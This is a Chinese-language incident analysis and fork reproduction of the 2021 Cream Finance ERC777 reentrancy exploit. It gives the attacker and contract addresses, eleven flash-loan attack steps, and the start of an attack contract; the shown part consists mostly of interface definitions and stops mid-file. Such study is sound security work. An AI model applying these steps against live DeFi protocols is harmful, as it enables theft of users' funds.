**作者：W2Ning  
原文链接：**
## 概述
上个月8月30日， Cream Finance 又双叒叕遭到了攻击，损失超 1800 万美元。
漏洞原理用一句话概括：`Cream的借贷经济模型未能考虑到ERC777Token的勾子函数所带来的重入风险`
## 事件分析
  * 攻击者地址
    0xce1f4b4f17224ec6df16eeb1e3e5321c54ff6ede
  * 其中一次攻击的交易哈希(既然大家都选这次分析我也选这次复现好了)
    0xa9a1b8ea288eb9ad315088f17f7c7386b9989c95b4d13c81b69d5ddad7ffe61e
  * 该攻击发生的块高度
    13125071 
#### 攻击合约A
    0x38c40427efbAAe566407e4CdE2A91947dF0bD22B
#### 攻击合约B
    0x0ec306D7634314D35139d1dF4A630d829475A125
#### 攻击步骤
  * 第一步 在ERC1820地址上调用`setInterfaceImplementer`,完成`AmpTokensRecipient`勾子函数的注册 
  * 第二步 攻击者从Uniswap通过`FlashSwap`借出500`WETH` 
  * 第三步 将500`WETH`换成500`ETH` 
  * 第四步 调用`crETH`的`mint`函数，将500`ETH`存入`crETH`获得借贷凭证 
  * 第五步 用其借贷凭证借出`19480000`个`AMP`,并通过攻击合约A中的勾子函数，再次借出355个`ETH` 
  * 第六步 攻击合约A生成一个新的合约 
  * 第七步 攻击合约A把一半借到的`AMP`转入攻击合约B，用来清算原合约的部分`crETH`, 
  * 第八步 攻击合约B清算攻击合约A的`crETH`赎回了约187个`ETH` 
  * 第九步 攻击合约B执行`SelfDestruct()`完成自毁，把约187个`ETH`转回攻击合约 
  * 第十步 攻击合约A 把355个`ETH`转为355个`WETH` 返回给`Uniswap`501.55个`WETH`,完成闪电贷流程 
  * 第十一步 攻击合约A把剩下的一半`AMP`和41个`WETH`转回攻击者得钱包地址 
## 复现步骤
本次复现不是特别完美,没有加入攻击者的`清算逻辑`,而是把借出的AMP`全部抛售`,归还闪电贷结束攻击.
这也是第一次学习ERC777Token的Hook函数如何实现,光是踩坑就已经让我精疲力尽了.
同时我找一个abi转solidity的工具,再也不用手写interface了,但同时攻击代码也因为8个interface变得特别长.
    https://gnidan.github.io/abi-to-sol/
但我仍旧认为,单文件比引入外部文件要省事.
选择在高度为`13125070`的块上Fork,部署攻击合约
点击Attack
攻击前的metamask余额
攻击后的metamask余额
  * 完整攻击合约代码如下
    // SPDX-License-Identifier: UNLICENSED
    // !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.0. SEE SOURCE BELOW. !!
    pragma solidity >=0.7.0 <0.9.0;
    interface IERC1820Registry {
        function setInterfaceImplementer(
            address _addr,
            bytes32 _interfaceHash,
            address _implementer
        ) external;
        function getManager(address _addr) external view returns (address);
        function setManager(address _addr, address _newManager) external;
        function interfaceHash(string memory _interfaceName)
            external
            pure
            returns (bytes32);
        function updateERC165Cache(address _contract, bytes4 _interfaceId) external;
        function getInterfaceImplementer(address _addr, bytes32 _interfaceHash)
            external
            view
            returns (address);
        function implementsERC165InterfaceNoCache(
            address _contract,
            bytes4 _interfaceId
        ) external view returns (bool);
        function implementsERC165Interface(address _contract, bytes4 _interfaceId)
            external
            view
            returns (bool);
        event InterfaceImplementerSet(
            address indexed addr,
            bytes32 indexed interfaceHash,
            address indexed implementer
        );
        event ManagerChanged(address indexed addr, address indexed newManager);
    }
    interface IERC777 {
        /**
         * @dev Returns the name of the token.
         */
        function name() external view returns (string memory);
        /**
         * @dev Returns the symbol of the token, usually a shorter version of the
         * name.
         */
        function symbol() external view returns (string memory);
        /**
         * @dev Returns the smallest part of the token that is not divisible. This
         * means all token operations (creation, movement and destruction) must have
         * amounts that are a multiple of this number.
         *
         * For most token contracts, this value will equal 1.
         */
        function granularity() external view returns (uint256);
        /**
         * @dev Returns the amount of tokens in existence.
         */
        function totalSupply() external view returns (uint256);
        /**
         * @dev Returns the amount of tokens owned by an account (`owner`).
         */
        function balanceOf(address owner) external view returns (uint256);
        /**
         * @dev Moves `amount` tokens from the caller's account to `recipient`.
         *
         * If send or receive hooks are registered for the caller and `recipient`,
         * the corresponding functions will be called with `data` and empty
         * `operatorData`. See {IERC777Sender} and {IERC777Recipient}.
         *
         * Emits a {Sent} event.
         *
         * Requirements
         *
         * - the caller must have at least `amount` tokens.
         * - `recipient` cannot be the zero address.
         * - if `recipient` is a contract, it must implement the {IERC777Recipient}
         * interface.
         */
        function send(
            address recipient,
            uint256 amount,
            bytes calldata data
        ) external;
        /**
         * @dev Destroys `amount` tokens from the caller's account, reducing the
         * total supply.
         *
         * If a send hook is registered for the caller, the corresponding function
         * will be called with `data` and empty `operatorData`. See {IERC777Sender}.
         *
         * Emits a {Burned} event.
         *
         * Requirements
         *
         * - the caller must have at least `amount` tokens.
         */
        function burn(uint256 amount, bytes calldata data) external;
        /**
         * @dev Returns true if an account is an operator of `tokenHolder`.
         * Operators can send and burn tokens on behalf of their owners. All
         * accounts are their own operator.
         *
         * See {operatorSend} and {operatorBurn}.
         */
        function isOperatorFor(address operator, address tokenHolder) external view returns (bool);
        /**
         * @dev Make an account an operator of the caller.
         *
         * See {isOperatorFor}.
         *
         * Emits an {AuthorizedOperator} event.
         *
         * Requirements
         *
         * - `operator` cannot be calling address.
         */
        function authorizeOperator(address operator) external;
        /**
         * @dev Revoke an account's operator status for the caller.
         *
         * See {isOperatorFor} and {defaultOperators}.
         *
         * Emits a {RevokedOperator} event.
         *
         * Requirements
         *
         * - `operator` cannot be calling address.
         */
        function revokeOperator(address operator) external;
        /**
         * @dev Returns the list of default operators. These accounts are operators
         * for all token holders, even if {authorizeOperator} was never called on
         * them.
         *
         * This list is immutable, but individual holders may revoke these via
         * {revokeOperator}, in which case {isOperatorFor} will return false.
         */
        function defaultOperators() external view returns (address[] memory);
        /**
         * @dev Moves `amount` tokens from `sender` to `recipient`. The caller must
         * be an operator of `sender`.
         *
         * If send or receive hooks are registered for `sender` and `recipient`,
         * the corresponding functions will be called with `data` and
         * `operatorData`. See {IERC777Sender} and {IERC777Recipient}.
         *
         * Emits a {Sent} event.
         *
         * Requirements
         *
         * - `sender` cannot be the zero address.
         * - `sender` must have at least `amount` tokens.
         * - the caller must be an operator for `sender`.
         * - `recipient` cannot be the zero address.
         * - if `recipient` is a contract, it must implement the {IERC777Recipient}
         * interface.
         */
        function operatorSend(
            address sender,
            address recipient,
            uint256 amount,
            bytes calldata data,
            bytes calldata operatorData
        ) external;
        /**
         * @dev Destroys `amount` tokens from `account`, reducing the total supply.
         * The caller must be an operator of `account`.
         *
         * If a send hook is registered for `account`, the corresponding function
         * will be called with `data` and `operatorData`. See {IERC777Sender}.
         *
         * Emits a {Burned} event.
         *
         * Requirements
         *
         * - `account` cannot be the zero address.
         * - `account` must have at least `amount` tokens.
         * - the caller must be an operator for `account`.
         */
        function operatorBurn(
            address account,
            uint256 amount,
            bytes calldata data,
            bytes calldata operatorData
        ) external;
        event Sent(
            address indexed operator,
            address indexed from,
            address indexed to,
            uint256 amount,
            bytes data,
            bytes operatorData
        );
        event Minted(address indexed operator, address indexed to, uint256 amount, bytes data, bytes operatorData);
        event Burned(address indexed operator, address indexed from, uint256 amount, bytes data, bytes operatorData);
        event AuthorizedOperator(address indexed operator, address indexed tokenHolder);
        event RevokedOperator(address indexed operator, address indexed tokenHolder);
    }
    interface Uni_Pair_V2 {
        event Approval( address indexed owner,address indexed spender,uint256 value ) ;
        event Burn( address indexed sender,uint256 amount0,uint256 amount1,address indexed to ) ;
        event Mint( address indexed sender,uint256 amount0,uint256 amount1 ) ;
        event Swap( address indexed sender,uint256 amount0In,uint256 amount1In,uint256 amount0Out,uint256 amount1Out,address indexed to ) ;
        event Sync( uint112 reserve0,uint112 reserve1 ) ;
        event Transfer( address indexed from,address indexed to,uint256 value ) ;
        function DOMAIN_SEPARATOR(  ) external view returns (bytes32 ) ;
        function MINIMUM_LIQUIDITY(  ) external view returns (uint256 ) ;
        function PERMIT_TYPEHASH(  ) external view returns (bytes32 ) ;
        function allowance( address ,address  ) external view returns (uint256 ) ;
        function approve( address spender,uint256 value ) external  returns (bool ) ;
        function balanceOf( address  ) external view returns (uint256 ) ;
        function burn( address to ) external  returns (uint256 amount0, uint256 amount1) ;
        function decimals(  ) external view returns (uint8 ) ;
        function factory(  ) external view returns (address ) ;
        function getReserves(  ) external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast) ;
        function initialize( address _token0,address _token1 ) external   ;
        function kLast(  ) external view returns (uint256 ) ;
        function mint( address to ) external  returns (uint256 liquidity) ;
        function name(  ) external view returns (string memory ) ;
        function nonces( address  ) external view returns (uint256 ) ;
        function permit( address owner,address spender,uint256 value,uint256 deadline,uint8 v,bytes32 r,bytes32 s ) external   ;
        function price0CumulativeLast(  ) external view returns (uint256 ) ;
        function price1CumulativeLast(  ) external view returns (uint256 ) ;
        function skim( address to ) external   ;
        function swap( uint256 amount0Out,uint256 amount1Out,address to,bytes memory data ) external   ;
        function symbol(  ) external view returns (string memory ) ;
        function sync(  ) external   ;
        function token0(  ) external view returns (address ) ;
        function token1(  ) external view returns (address ) ;
        function totalSupply(  ) external view returns (uint256 ) ;
        function transfer( address to,uint256 value ) external  returns (bool ) ;
        function transferFrom( address from,address to,uint256 value ) external  returns (bool ) ;
    }
    interface Uni_Router_V2{
        function WETH(  ) external view returns (address ) ;
        function addLiquidity( address tokenA,address tokenB,uint256 amountADesired,uint256 amountBDesired,uint256 amountAMin,uint256 amountBMin,address to,uint256 deadline ) external  returns (uint256 amountA, uint256 amountB, uint256 liquidity) ;
        function addLiquidityETH( address token,uint256 amountTokenDesired,uint256 amountTokenMin,uint256 amountETHMin,address to,uint256 deadline ) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity) ;
        function factory(  ) external view returns (address ) ;
        function getAmountIn( uint256 amountOut,uint256 reserveIn,uint256 reserveOut ) external pure returns (uint256 amountIn) ;
        function getAmountOut( uint256 amountIn,uint256 reserveIn,uint256 reserveOut ) external pure returns (uint256 amountOut) ;
        function getAmountsIn( uint256 amountOut,address[] memory path ) external view returns (uint256[] memory amounts) ;
        function getAmountsOut( uint256 amountIn,address[] memory path ) external view returns (uint256[] memory amounts) ;
        function quote( uint256 amountA,uint256 reserveA,uint256 reserveB ) external pure returns (uint256 amountB) ;
        function removeLiquidity( address tokenA,address tokenB,uint256 liquidity,uint256 amountAMin,uint256 amountBMin,address to,uint256 deadline ) external  returns (uint256 amountA, uint256 amountB) ;